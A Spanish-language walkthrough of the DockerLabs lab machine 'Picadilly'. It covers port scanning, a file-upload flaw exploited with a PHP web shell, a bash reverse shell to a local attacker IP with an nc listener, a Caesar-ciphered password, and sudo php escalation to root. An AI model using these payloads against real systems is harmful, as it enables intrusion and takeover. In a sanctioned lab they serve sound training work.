# PICADILLY - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina Picadilly. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./picadilly.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: fácil
- Sistema Operativo: linux
- Autor: kaikoperez

## RECONOCIMIENTO DE RED

### conectividad y SO

Primero hacemos `ping -c 1 172.17.0.2` para enviar un paquete ICMP a la máquina.
> `-c 1` Solo enviar 1 paquete ICMP

![image](https://github.com/user-attachments/assets/12171f6c-fbb0-4bbf-8e74-f453568dc17b)

Y nos llega respuesta. Como el TTL es de 64 el sistema operativo de la máquina muy posiblemente sea Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/57808989-a8cf-4a58-8e5d-dfc8556aba8f)

Están abiertos el puerto 80 y 443. Ahora lanzamos un escaneo de versiones con nmap, y también lanzamos scripts de reconocimiento estándar:

```python
nmap -p80,443 -sCV 172.17.0.2 -oN targeted
```

> `-p80,443` hacer el escaneo solo sobre estos dos puertos

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/f999fd7c-aabf-4757-9d07-d429fbf654c4)

Podemos ver varios datos, como las versiones de Apache o algún nombre de dominio. También vemos que nos ha encontrado un archivo `backup.txt` en el servidor web del puerto 80.

## RECONOCIMIENTO WEB

Empezamos lanzando desde consola el comando `whatweb` sobre el puerto 80:

```python
whatweb http://172.17.0.2
```

![image](https://github.com/user-attachments/assets/005cf3cf-fbd7-4556-901b-ea8a65c06a58)

Vemos que el título es `Index of /`, por lo que alomejor hay directory listing. Cargamos el servidor en el navegador:

![image](https://github.com/user-attachments/assets/90de0b8f-6620-4a3f-add7-66b641b5912a)

Sí que se aplica directory listing, también vemos el archivo `backup.txt` que encontró nmap:

![image](https://github.com/user-attachments/assets/8b3fd0fb-3661-45dc-81e3-83fcb1fe6661)

Nos da una contraseña cifrada que nos puede servir más adelante. Pero como la máquina no tiene servidor SSH no podemos usarla todavía.

Pasamos al puerto 443:

```python
whatweb https://172.17.0.2
```

![image](https://github.com/user-attachments/assets/249f7ca6-527c-4ed6-bfd6-dc59e76b57e7)

No vemos ninguna información interesante. Cargamos la web en el navegador:

![image](https://github.com/user-attachments/assets/d67fd988-4d7a-40e2-b92a-79ee182f7437)

Parece ser una web de posts. Además, abajo hay una opción para crear nuestro propio post subiendo un archivo local. Podemos intuir que hay un directorio `/uploads` en donde se almacenen los posts:

![image](https://github.com/user-attachments/assets/eef522d1-0a81-41f6-a298-0bf07ed8530d)

Vemos que sí que existe, además ahí se almacena el post que vimos antes.

## EXPLOTACIÓN WEB

Podemos probar a subir un archivo con código PHP para ejecutar comandos, y cargarlo desde `/uploads` y ver si se interpreta el código. Creamos un archivo llamado `shell.php`, por ejemplo, y que tenga un código que nos permita ejecutar comandos en el sistema mediante la variable `cmd`:

```python
<?php
    system($_GET['cmd']);
?>
```

Y ahora lo subimos.

![image](https://github.com/user-attachments/assets/b0f025e3-2008-4fd5-8886-102a4034e915)

Vemos que en la página principal desde la cual se ven los posts, no se interpreta el código. Pero si probamos a ir a `/uploads/shell.php?cmd=id`:

![image](https://github.com/user-attachments/assets/86db851f-e03f-4881-a22e-5096bc67e0e4)

Vemos que interpreta el código PHP, y ganamos RCE. Ahora para enviarnos una reverse shell, ejecutamos este comando:

``` python
/bin/bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

Desde la web. Pero antes nos ponemos en escucha:

```python
nc -nlvp 443
```

![image](https://github.com/user-attachments/assets/e4a99c4e-983f-4dfb-afd1-0ec53d74f718)

Y recibimos la reverse shell. Ahora hacemos el tratamiento de la TTY.

## TRATAMIENTO TTY

```python
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```

Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

## ESCALADA DE PRIVILEGIOS (MATEO)

Como somos el usuario www-data, podemos intentar escalar a el usuario mateo, que sabemos que existe gracias al archivo `backup.txt` del puerto 80. Además nos dieron su contraseña: hdvbfuadcb. Pero se le ha aplicado un tipo de Cifrado César. Podemos descifrarlo en la web [decode.fr](https://www.dcode.fr/caesar-cipher):

![image](https://github.com/user-attachments/assets/5fd03a0b-b954-4020-a6a0-93de4fa06264)

Vemos todos los tipos de desplazamientos que aplica. Entre todos, hay uno que destaca, ya que el resultado es "easycrxazy", que parece legible. Si probamos a cambiarnos al usuario mateo usando `su mateo` con esa contraseña, no nos deja. Podemos probar a poner "easycrazy", y de esta forma conseguimos cambiarnos al usuario mateo.

## ESCALADA DE PRIVILEGIOS (ROOT)

Siendo el usuario mateo, podemos hacer `sudo -l` para ver nuestros privilegios especiales de sudo:

![image](https://github.com/user-attachments/assets/4a8b9f75-223d-4df0-9ac8-02bb0129d0cd)

Vemos que podemos ejecutar como cualquier usuario del sistema, sin usar nuestra contraseña, el binario de PHP: `/usr/bin/php`. Esto es crítico ya que podemos escalar fácilmente al usuario root llamando a la función `system()` para ejecutar una bash: 

```python
sudo php -r "system('/bin/bash');"
```

![image](https://github.com/user-attachments/assets/ccafd4c3-ec82-49a2-bff5-3ae50ce3b85a)

Y ganamos una bash como el usuario root en la máquina Picadilly.